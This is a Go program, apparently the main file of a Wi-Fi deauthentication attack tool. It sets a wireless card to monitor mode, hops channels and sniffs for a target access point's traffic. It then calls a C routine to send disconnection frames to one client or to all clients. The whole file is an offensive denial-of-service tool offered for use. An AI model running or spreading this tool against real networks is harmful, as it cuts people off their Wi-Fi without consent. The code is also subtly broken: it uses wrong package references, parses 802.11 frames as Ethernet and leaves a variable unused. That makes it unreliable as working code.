package main

/*
#cgo LDFLAGS: -lpcap -lpthread
#include "deauth.h"
*/
import "C"
import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type Args struct {
	interfaceName string
	targetAP      net.HardwareAddr
	targetClient  net.HardwareAddr
}

var args Args
var handle *pcap.Handle

// setupMonitorMode sets the network interface into monitor mode.
func setupMonitorMode(interfaceName string) {
	if err := exec.Command("ifconfig", interfaceName, "down").Run(); err != nil {
		log.Printf("Failed to bring interface down: %v", err)
		return
	}
	if err := exec.Command("iwconfig", interfaceName, "mode", "monitor").Run(); err != nil {
		log.Printf("Failed to set monitor mode: %v", err)
		return
	}
	if err := exec.Command("ifconfig", interfaceName, "up").Run(); err != nil {
		log.Printf("Failed to bring interface up: %v", err)
		return
	}
	fmt.Printf("Monitor mode enabled on %s\n", interfaceName)
}

// restoreMode restores the network interface to managed mode.
func restoreMode(interfaceName string) {
	if err := exec.Command("iwconfig", interfaceName, "mode", "managed").Run(); err != nil {
		log.Printf("Failed to restore mode: %v", err)
	}
}

// channelHop continuously hops between channels.
func channelHop(interfaceName string) {
	for {
		for ch := 1; ch <= 13; ch++ {
			cmd := exec.Command("iw", "dev", interfaceName, "set", "channel", fmt.Sprintf("%d", ch))
			if err := cmd.Run(); err != nil {
				log.Printf("Error switching channel: %v", err)
			}
			fmt.Printf("Switched to channel %d\n", ch)
			time.Sleep(1 * time.Second)
		}
	}
}

// capturePackets captures packets from the network.
func capturePackets() {
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		ethLayer := packet.Layer(gopacket.LayerTypeEthernet)
		if ethLayer == nil {
			continue
		}

		ethernet, ok := ethLayer.(*gopacket.Ethernet)
		if !ok {
			log.Println("Error asserting Ethernet layer")
			continue
		}

		if ethernet.SrcMAC.String() == args.targetAP.String() {
			if args.targetClient != nil {
				if ethernet.DstMAC.String() == args.targetClient.String() {
					C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), (*C.u_char)(&args.targetClient[0]))
				}
			} else {
				C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), nil)
			}
		}
	}
}

// scanNetworks scans for available networks.
func scanNetworks() error {
	cmd := exec.Command("iw", "dev", args.interfaceName, "scan")
	output, err := cmd.Output()
	if err != nil {
		return err
	}

	fmt.Println("Available Networks:")
	fmt.Println(string(output))

	return nil
}

func main() {
	interfaceFlag := flag.String("i", "wlan0", "Network interface")
	apFlag := flag.String("ap", "", "Target Access Point MAC address")
	clientFlag := flag.String("client", "", "Target Client MAC address")
	scanFlag := flag.Bool("scan", false, "Scan for available networks")
	allFlag := flag.Bool("a", false, "Deauth all clients")

	flag.Parse()

	args.interfaceName = *interfaceFlag

	if *apFlag != "" {
		parsedAP, err := net.ParseMAC(*apFlag)
		if err != nil {
			log.Fatalf("Invalid AP MAC address: %v", err)
		}
		args.targetAP = parsedAP
	}

	if *clientFlag != "" {
		parsedClient, err := net.ParseMAC(*clientFlag)
		if err != nil {
			log.Fatalf("Invalid Client MAC address: %v", err)
		}
		args.targetClient = parsedClient
	}

	setupMonitorMode(args.interfaceName)

	if *scanFlag {
		if err := scanNetworks(); err != nil {
			log.Fatalf("Failed to scan networks: %v", err)
		}
		os.Exit(0)
	}

	var err error
	handle, err = pcap.OpenLive(args.interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Could not open device: %v", err)
	}
	defer handle.Close()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		restoreMode(args.interfaceName)
		os.Exit(0)
	}()

	go channelHop(args.interfaceName)

	capturePackets()
}
